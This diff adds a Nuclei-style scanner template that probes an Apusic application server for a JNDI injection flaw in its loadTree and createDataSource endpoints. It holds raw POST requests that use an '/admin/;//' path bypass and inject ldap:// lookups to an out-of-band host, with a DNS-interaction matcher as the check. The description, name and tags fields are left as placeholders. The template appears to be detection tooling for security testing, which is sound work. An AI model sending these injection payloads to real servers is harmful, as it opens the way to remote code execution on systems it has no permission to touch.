@@ -1,0 +1,36 @@
+id: kidee-eas-loadTree-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: description
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E8%9D%B6Apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8loadTree%20JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /appmonitor/protect/jndi/loadTree HTTP/1.1
+        Host: {{Hostname}}
+
+        jndiName=ldap://{{interactsh-url}}
+      - |-
+        POST /admin/;//protect/jndi/loadTree HTTP/1.1
+        Host: {{Hostname}}
+
+        jndiName=ldap://{{interactsh-url}}
+      - |
+        POST /admin/;//protect/datasource/createDataSource HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+        Content-Length: 260
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        name=nobg7&jndiName=ldap://{{interactsh-url}}/ahsdhashduqwe&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=nobg7&userName=nobg7&password=nobg7&repassword=nobg7&connectionURL=sdasd&driverClassName=java.lang.String&testCommand=
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
